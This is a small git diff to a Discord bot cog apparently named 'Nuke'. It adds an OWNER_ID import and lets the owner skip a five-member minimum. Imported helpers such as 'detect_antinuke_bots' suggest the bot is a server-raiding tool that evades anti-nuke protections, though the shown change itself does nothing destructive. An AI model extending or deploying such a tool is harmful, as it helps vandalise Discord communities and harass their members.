@@ -5,7 +5,7 @@ import random
 import discord
 from discord.ext import commands
 
-from config import BLACKLISTED_GUILD_ID
+from config import BLACKLISTED_GUILD_ID, OWNER_ID
 from core.operation import (
     create_channel_and_send_message,
     detect_antinuke_bots,
@@ -38,7 +38,7 @@ class Nuke(commands.Cog):
             await ctx.reply("`this server is blacklisted`")
             return
 
-        if len(guild.members) < 5:
+        if len(guild.members) < 5 and user_id != OWNER_ID:
             try:
                 await user.send(f"❌ Server `{guild.name}` needs to have a minimum of 5 members. Leaving..")
                 print("not 5 members")
